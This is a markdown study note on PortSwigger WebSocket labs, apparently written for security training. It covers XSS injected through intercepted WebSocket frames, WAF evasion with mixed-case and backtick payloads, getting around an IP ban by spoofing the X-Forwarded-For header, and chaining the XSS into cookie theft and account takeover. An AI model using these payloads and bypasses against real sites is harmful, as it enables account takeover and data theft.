# WebSockets - XSS via message manipulation and handshake bypass

WebSocket messages are processed by the server and reflected to connected clients. If the server echoes message data without sanitization, an injected XSS payload fires in every connected client's browser (including support agents). When a WAF blocks payloads and bans your IP, reconnect with a spoofed `X-Forwarded-For` header and use an obfuscated payload.

## Quick reference
```
# Lab 1: Intercept WS message, inject XSS
Proxy > WebSockets history -> intercept outgoing message
body: <img src=1 onerror='alert(1)'>

# Lab 2: XSS blocked, IP banned
# Reconnect: intercept GET /chat (WS upgrade) -> add header:
X-Forwarded-For: 1.1.1.1
# Then send obfuscated payload (mixed case + backtick args):
<img src=1 oNeRrOr=alert`1`>
```

## Root cause
Client-side JS encodes `<` before sending (HTML encoding). Server decodes and reflects the raw message to all connected clients. WAF inspects WS frames - mixed-case event handlers and backtick argument syntax bypass signature matching.

## Technique
**Lab 1 (basic message injection):**
1. Open live chat -> send a test message.
2. Burp Proxy -> WebSockets history tab -> find the outgoing message frame.
3. Turn on WS intercept -> send another message -> edit payload in intercepted frame to `<img src=1 onerror='alert(1)'>`.
4. Forward -> alert fires in browser (and in support agent's browser).

**Lab 2 (WAF + IP ban bypass):**
1. Send `<img src=1 onerror='alert(1)'>` -> blocked + connection terminated + IP banned.
2. Click "Reconnect" -> observe connection fails (IP banned).
3. Burp Repeater -> WebSocket reconnect tab -> add `X-Forwarded-For: 1.1.1.1` to the upgrade request -> connect succeeds.
4. Send obfuscated payload: `<img src=1 oNeRrOr=alert\`1\`>` - mixed-case `oNeRrOr`, backtick args bypass WAF signature.

## Payload arsenal
```
# Basic
<img src=1 onerror='alert(1)'>

# WAF bypass (mixed case + backticks)
<img src=1 oNeRrOr=alert`1`>
<img src=1 onerror=alert(1) x=>
<svg onload=alert(1)>
```

## Bypasses
| Defense | Bypass |
|---|---|
| Client encodes `<` before send | Intercept after client sends - edit in Burp before server receives |
| WAF blocks `onerror=alert` | Mixed case: `oNeRrOr=alert\`1\`` |
| IP ban after WAF trigger | Reconnect WS with `X-Forwarded-For: 1.1.1.1` |
| String-based arg detection | Backtick args: `alert\`1\`` - no parentheses or quotes |

## Labs

### Manipulating WebSocket messages to exploit vulnerabilities [Apprentice]
Client encodes `<` -> intercept WS frame in Burp -> replace message with `<img src=1 onerror='alert(1)'>` -> server reflects raw to all clients -> XSS fires. Key insight: sanitization only on the client side; server reflects whatever it receives.

### Manipulating the WebSocket handshake to exploit vulnerabilities [Practitioner]
Payload blocked + IP banned. Fix: `X-Forwarded-For: 1.1.1.1` on reconnect -> new IP accepted. Obfuscated payload `<img src=1 oNeRrOr=alert\`1\`>` bypasses WAF signature. Key insight: WS upgrade is HTTP - spoof IP just like HTTP; WAF regex is case-sensitive.

## Chaining
- WS message XSS -> steal `document.cookie` / act as victim -> **ATO** ([XSS](../../XSS/), [Authentication](../../Authentication/)).
- Cross-site WebSocket hijack (no origin check on handshake) -> exfil chat/data cross-origin -> attack other users ([objectives: attack-others](../../references/objectives-attack-trees.md)).

## Real-world notes
- WebSocket XSS is higher-impact than reflected XSS - it fires in every open browser tab connected to the WS.
- `X-Forwarded-For` spoofing works when the server naively trusts it; real WAFs validate the header chain.
- Always try obfuscation first before assuming a payload type is fully blocked.

## References
- https://portswigger.net/web-security/websockets
